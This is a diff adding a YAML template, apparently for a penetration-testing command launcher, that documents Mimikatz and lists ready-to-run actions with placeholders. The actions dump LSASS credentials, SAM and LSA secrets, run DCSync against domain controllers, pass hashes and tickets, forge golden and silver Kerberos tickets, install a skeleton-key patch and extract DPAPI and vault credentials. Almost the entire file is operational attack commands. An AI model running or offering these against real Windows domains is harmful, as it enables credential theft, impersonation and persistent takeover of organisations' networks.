@@ -1,0 +1,69 @@
+---
+tool: mimikatz
+description: Credential dumping and Kerberos forging on Windows with Mimikatz
+notes: |
+  NAME
+      mimikatz - extract plaintext passwords, hashes and Kerberos
+      tickets from memory, and forge/pass them
+
+  SYNOPSIS
+      mimikatz.exe "module::command /arg:value" ... exit
+
+  DESCRIPTION
+      Runs on a Windows target. Most modules need SeDebug + local
+      admin, so start with `privilege::debug`. Chain commands on one
+      line and end with `exit`; `token::elevate` grabs SYSTEM for
+      LSA/SAM access. Tickets (.kirbi) feed Rubeus/ptt; hashes crack
+      with hashcat -m 1000 (NTLM) or feed pass-the-hash.
+
+  COMMON MODULES
+      privilege::debug      enable SeDebugPrivilege (do first)
+      sekurlsa::logonpasswords   dump creds from LSASS memory
+      sekurlsa::ekeys       Kerberos encryption keys (aes/rc4)
+      lsadump::sam          local account NT hashes (SAM)
+      lsadump::lsa          secrets / cached creds (needs SYSTEM)
+      lsadump::dcsync       pull hashes from a DC over replication
+      kerberos::golden      forge a golden/silver TGT
+      sekurlsa::pth         pass-the-hash to spawn a process
+
+  EXAMPLES
+      mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit
+      mimikatz "lsadump::dcsync /user:krbtgt" exit
+
+actions:
+  - title: logonpasswords
+    command: 'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"'
+  - title: ekeys
+    command: 'mimikatz.exe "privilege::debug" "sekurlsa::ekeys" "exit"'
+  - title: wdigest
+    command: 'mimikatz.exe "privilege::debug" "sekurlsa::wdigest" "exit"'
+  - title: msv
+    command: 'mimikatz.exe "privilege::debug" "sekurlsa::msv" "exit"'
+  - title: tickets-export
+    command: 'mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"'
+  - title: lsadump-sam
+    command: 'mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"'
+  - title: lsadump-lsa
+    command: 'mimikatz.exe "privilege::debug" "token::elevate" "lsadump::lsa /inject" "exit"'
+  - title: lsadump-secrets
+    command: 'mimikatz.exe "privilege::debug" "token::elevate" "lsadump::secrets" "exit"'
+  - title: dcsync-user
+    command: 'mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:{{dn}} /user:{{ user | default(''krbtgt'') }}" "exit"'
+  - title: dcsync-all
+    command: 'mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:{{dn}} /all /csv" "exit"'
+  - title: pth
+    command: 'mimikatz.exe "privilege::debug" "sekurlsa::pth /user:{{un}} /domain:{{dn}} /ntlm:{{hash}} /run:cmd.exe" "exit"'
+  - title: ptt
+    command: 'mimikatz.exe "privilege::debug" "kerberos::ptt {{ ticket | default(''ticket.kirbi'') }}" "exit"'
+  - title: golden-ticket
+    command: 'mimikatz.exe "privilege::debug" "kerberos::golden /user:{{ impersonate | default(''Administrator'') }} /domain:{{dn}} /sid:{{sid}} /krbtgt:{{hash}} /ptt" "exit"'
+  - title: silver-ticket
+    command: 'mimikatz.exe "privilege::debug" "kerberos::golden /user:{{ impersonate | default(''Administrator'') }} /domain:{{dn}} /sid:{{sid}} /target:{{ target | default(''host.corp.local'') }} /service:{{ service | default(''cifs'') }} /rc4:{{hash}} /ptt" "exit"'
+  - title: kerberos-list
+    command: 'mimikatz.exe "kerberos::list /export" "exit"'
+  - title: lsa-patch
+    command: 'mimikatz.exe "privilege::debug" "misc::skeleton" "exit"'
+  - title: dpapi-cred
+    command: 'mimikatz.exe "privilege::debug" "dpapi::cred /in:{{ credfile | default(''C:\\Users\\user\\AppData\\Local\\Microsoft\\Credentials\\FILE'') }}" "exit"'
+  - title: vault
+    command: 'mimikatz.exe "privilege::debug" "vault::cred /patch" "exit"'
